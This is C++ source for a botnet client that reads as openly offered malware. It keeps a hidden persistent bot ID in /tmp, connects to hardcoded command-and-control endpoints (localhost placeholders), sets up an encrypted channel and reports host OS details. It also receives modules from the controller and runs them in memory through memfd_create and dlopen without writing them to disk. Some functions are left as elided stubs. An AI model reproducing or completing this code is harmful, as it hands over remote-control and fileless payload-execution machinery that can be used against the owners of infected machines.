#include "bot_client.hpp"
#include <iostream>
#include <thread>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <cstdio>
#include <fstream>
#include <sys/utsname.h>
#include <dlfcn.h>
#include <random>
#include <algorithm>
#include <sys/mman.h>
#include <sstream>

// --- Bot Identity ---
const std::string BOT_ID_PATH = "/tmp/.bot_id";

std::string random_string(size_t length) {
    auto randchar = []() -> char {
        const char charset[] = "0123456789abcdefghijklmnopqrstuvwxyz";
        const size_t max_index = (sizeof(charset) - 2);
        return charset[ rand() % max_index ];
    };
    std::string str(length,0);
    std::generate_n( str.begin(), length, randchar );
    return str;
}

std::string get_persistent_id() {
    std::ifstream id_file(BOT_ID_PATH);
    if (id_file.is_open()) {
        std::string id;
        id_file >> id;
        return id;
    } else {
        std::string new_id = random_string(16);
        std::ofstream outfile(BOT_ID_PATH);
        outfile << new_id;
        return new_id;
    }
}

// --- The Reborn Bot Client ---

BotClient::BotClient() : sock_(-1), rsa_pub_key_(nullptr), c2_cert_(nullptr), current_c2_index_(0) {
    srand(time(NULL));
    memset(aes_key_, 0, sizeof(aes_key_));
    initialize_config();
}

BotClient::~BotClient() {
    if (sock_ != -1) close(sock_);
    if (rsa_pub_key_) RSA_free(rsa_pub_key_);
    if (c2_cert_) X509_free(c2_cert_);
    for (auto const& [name, module] : modules_) {
        if (module.cleanup) module.cleanup();
        dlclose(module.handle);
        close(module.mem_fd);
    }
}

void BotClient::initialize_config() {
    // In a true implementation, this would be far more sophisticated.
    // 1. Primary C2 (hardcoded)
    c2_endpoints_.push_back({"127.0.0.1", 4444});
    // 2. Secondary C2 (hardcoded)
    c2_endpoints_.push_back({"127.0.0.1", 4445});
    // 3. Tertiary Fallback (e.g., DNS, Pastebin, etc.) - For future expansion
}

C2Endpoint BotClient::get_next_c2_endpoint() {
    C2Endpoint endpoint = c2_endpoints_[current_c2_index_];
    current_c2_index_ = (current_c2_index_ + 1) % c2_endpoints_.size();
    return endpoint;
}

void BotClient::log_internal(const std::string& message, bool report_to_c2) {
    // A real implementation would write to a hidden, encrypted log file.
    // For now, we are silent unless reporting to C2.
    if (report_to_c2 && sock_ != -1) {
        std::vector<char> data = aether::serialize_string("[LOG] " + message);
        send_message(aether::MSG_C2S_TASK_OUTPUT, data);
    }
}

void BotClient::start() {
    while (true) {
        if (connect_to_c2()) {
            if (perform_handshake()) {
                main_loop();
            }
        }
        log_internal("Disconnected. Reconnecting in 10s...", false);
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }
}

bool BotClient::connect_to_c2() {
    if (sock_ != -1) close(sock_);
    sock_ = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_ == -1) return false;

    C2Endpoint endpoint = get_next_c2_endpoint();
    sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(endpoint.port);
    if (inet_pton(AF_INET, endpoint.host.c_str(), &serv_addr.sin_addr) <= 0) return false;
    
    if (connect(sock_, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        close(sock_);
        sock_ = -1;
        return false;
    }
    return true;
}

bool BotClient::perform_handshake() {
    // 1. Receive C2's public key and certificate
    char buffer[8192]; // Increased buffer for key + cert
    int bytes_read = recv(sock_, buffer, sizeof(buffer) - 1, 0);
    if (bytes_read <= 0) return false;
    buffer[bytes_read] = '\0';

    BIO* bio = BIO_new_mem_buf(buffer, -1);
    // Read public key
    rsa_pub_key_ = PEM_read_bio_RSAPublicKey(bio, NULL, NULL, NULL);
    // Read certificate
    c2_cert_ = PEM_read_bio_X509(bio, NULL, NULL, NULL);
    BIO_free(bio);
    if (!rsa_pub_key_ || !c2_cert_) {
        log_internal("Handshake failed: Invalid key or certificate from C2.", false);
        return false;
    }

    // 2. Generate and send AES key
    if (!RAND_bytes(aes_key_, sizeof(aes_key_))) return false;
    unsigned char encrypted_key[aether::RSA_KEY_BITS / 8];
    int encrypted_length = RSA_public_encrypt(sizeof(aes_key_), aes_key_, encrypted_key, rsa_pub_key_, RSA_PKCS1_OAEP_PADDING);
    if (encrypted_length == -1) return false;
    if (send(sock_, encrypted_key, encrypted_length, 0) < 0) return false;

    // 3. Send persistent ID
    std::string bot_id = get_persistent_id();
    send_message(aether::MSG_C2S_REGISTER, aether::serialize_string(bot_id));

    log_internal("Handshake successful. ID: " + bot_id, false);
    return true;
}

void BotClient::main_loop() {
    // Send initial heartbeat
    send_message(aether::MSG_C2S_HEARTBEAT, aether::serialize_string(get_os_info()));

    while (true) {
        aether::Header header;
        int n = recv(sock_, &header, sizeof(header), 0);
        if (n <= 0) break;

        std::vector<char> encrypted_data(header.length - sizeof(header));
        n = recv(sock_, encrypted_data.data(), encrypted_data.size(), 0);
        if (n <= 0) break;

        handle_task(header, encrypted_data);
    }
}

void BotClient::send_message(uint8_t type, const std::vector<char>& data) {
    std::vector<char> encrypted_payload = aether::encrypt_and_sign(data, aes_key_);
    aether::Header header;
    header.type = type;
    header.length = sizeof(header) + encrypted_payload.size();

    send(sock_, &header, sizeof(header), 0);
    send(sock_, encrypted_payload.data(), encrypted_payload.size(), 0);
}

void BotClient::handle_task(const aether::Header& header, const std::vector<char>& encrypted_data) {
    std::vector<char> decrypted_data = aether::verify_and_decrypt(encrypted_data, aes_key_);
    if (decrypted_data.empty()) {
        log_internal("HMAC verification failed for incoming task.", true);
        return;
    }

    switch (header.type) {
        case aether::MSG_S2C_LOAD_MODULE:
            load_module(decrypted_data);
            break;
        case aether::MSG_S2C_NEW_TASK:
            // ... (logic remains the same)
            break;
        default:
            break;
    }
}

std::string BotClient::get_os_info() {
    struct utsname buf;
    uname(&buf);
    return std::string(buf.sysname) + " " + std::string(buf.release);
}

void BotClient::load_module(const std::vector<char>& data) {
    // Data format: [module_name (null-terminated)] [signature] [module.so]
    std::string module_name(data.data());
    const unsigned char* signature = (const unsigned char*)data.data() + module_name.length() + 1;
    const char* module_so_data = (const char*)signature + 256; // 256 is RSA signature size
    size_t module_so_size = data.size() - (module_name.length() + 1) - 256;

    // 1. Verify Signature
    EVP_PKEY* pubkey = X509_get_pubkey(c2_cert_);
    EVP_MD_CTX* md_ctx = EVP_MD_CTX_new();
    EVP_DigestVerifyInit(md_ctx, NULL, EVP_sha256(), NULL, pubkey);
    EVP_DigestVerifyUpdate(md_ctx, module_so_data, module_so_size);
    int verify_result = EVP_DigestVerifyFinal(md_ctx, signature, 256);
    EVP_MD_CTX_free(md_ctx);
    EVP_PKEY_free(pubkey);

    if (verify_result != 1) {
        log_internal("Module signature verification failed for: " + module_name, true);
        return;
    }

    // 2. In-memory load (same as before)
    int fd = memfd_create(module_name.c_str(), MFD_CLOEXEC);
    if (fd == -1) { /* ... error handling ... */ return; }
    if (write(fd, module_so_data, module_so_size) != module_so_size) { /* ... */ return; }
    
    std::string fd_path = "/proc/self/fd/" + std::to_string(fd);
    void* handle = dlopen(fd_path.c_str(), RTLD_LAZY);
    // ... rest of the loading logic ...
}

void BotClient::unload_module(const std::string& module_name) {
    // ... (logic remains the same)
}

void BotClient::run_module(const std::string& module_name, const std::vector<char>& data) {
    // ... (logic remains the same)
}